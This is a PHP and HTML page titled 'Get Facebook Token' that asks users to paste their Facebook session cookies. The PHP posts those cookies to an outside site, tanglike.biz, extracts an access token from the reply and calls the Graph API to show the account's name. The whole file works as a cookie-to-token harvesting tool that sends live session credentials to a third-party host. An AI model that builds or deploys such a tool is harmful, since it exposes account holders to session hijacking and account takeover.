<?php
$profileName = ""; // Initialize variable to store profile name

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check if the cookie input is provided
    if (!empty($_POST['cookie'])) {
        $cookieString = $_POST['cookie'];

        // cURL setup to send the POST request to get the token
        $url = 'https://tanglike.biz/gettokenig.php';
        $data = [
            'cookie' => $cookieString,
            'submit' => 'Get token'
        ];

        // Initialize cURL session to get token
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

        // Execute cURL and get the response
        $response = curl_exec($ch);

        // Handle cURL errors
        if ($response === false) {
            $error_msg = curl_error($ch);
            $token = "Error: " . $error_msg;
        } else {
            if (strpos($response, "Cookie die") !== false) {
                $token = "Cookie lỗi, hãy login lại thử lại";
            } elseif (strpos($response, "EAABw") !== false) {
                $token = "EAABw" . explode('EAABw', explode('</textarea>', $response)[0])[1];
            } else {
                $token = "Lỗi, hãy báo cho admin";
            }
        }

        // If a valid token is found, use the Graph API to get user data
        if (!empty($token) && strpos($token, "EAABw") === 0) {
            $profileName = getProfileNameFromGraph($token);
        }

        // Close the cURL session
        curl_close($ch);
    } else {
        $token = "Please enter cookies.";
    }
}

// Function to fetch profile name using the Graph API
function getProfileNameFromGraph($token) {
    $graphUrl = "https://graph.facebook.com/me?access_token=$token";

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $graphUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL and get the response
    $response = curl_exec($ch);

    // Handle cURL errors
    if ($response === false) {
        $profileName = "Error fetching profile data.";
    } else {
        $profileData = json_decode($response, true);
        if (isset($profileData['name'])) {
            $profileName = $profileData['name'];
        } else {
            $profileName = "Error: Unable to fetch profile data.";
        }
    }

    // Close the cURL session
    curl_close($ch);

    return $profileName;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get Token</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11"></link>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
    body {
      font-family: 'Roboto', sans-serif;
    }
    .glow-button {
      transition: all 0.3s ease;
    }
    .glow-button:hover {
      box-shadow: 0 0 20px rgba(72, 187, 120, 0.6);
    }
  </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

  <div class="container max-w-md mx-auto bg-white p-8 rounded-lg shadow-lg">
    <h1 class="text-2xl font-bold text-center mb-6">Get Facebook Token</h1>
    <form method="POST" action="">
      <div class="input-group mb-4">
        <label for="cookieInput" class="block text-gray-700 font-bold mb-2">Enter Facebook Cookies:</label>
        <input type="text" id="cookieInput" name="cookie" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="Paste your cookies here" value="<?php echo isset($_POST['cookie']) ? htmlspecialchars($_POST['cookie']) : ''; ?>">
      </div>
      <button type="submit" class="w-full p-3 bg-green-500 text-white font-bold rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">Get Token</button>
    </form>

    <?php if (isset($token)): ?>
      <div class="relative mt-4">
        <input type="text" id="token" class="w-full p-3 border border-gray-300 rounded-lg bg-gray-100" readonly value="<?php echo htmlspecialchars($token); ?>" placeholder="Your token will appear here">
        <button id="copyToken" class="absolute right-2 top-2 p-2 bg-green-500 text-white rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">
          <i class="fas fa-copy"></i>
        </button>
      </div>
    <?php endif; ?>

    <?php if ($profileName): ?>
      <div class="mt-6 text-center">
        <h3 class="font-bold text-lg">Welcome, <?php echo htmlspecialchars($profileName); ?>!</h3>
      </div>
    <?php endif; ?>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script>
    $("#copyToken").click(function(){
      const token = $("#token").val();
      if(token) {
        navigator.clipboard.writeText(token).then(function() {
          Swal.fire({
            icon: 'success',
            title: 'Token copied!',
            text: 'Your token has been copied to the clipboard.',
            showConfirmButton: false,
            timer: 1500
          });
        }, function(err) {
          Swal.fire({
            icon: 'error',
            title: 'Oops...',
            text: 'Failed to copy token: ' + err,
          });
        });
      } else {
        Swal.fire({
          icon: 'warning',
          title: 'No token',
          text: 'There is no token to copy.',
        });
      }
    });
  </script>
</body>
</html>
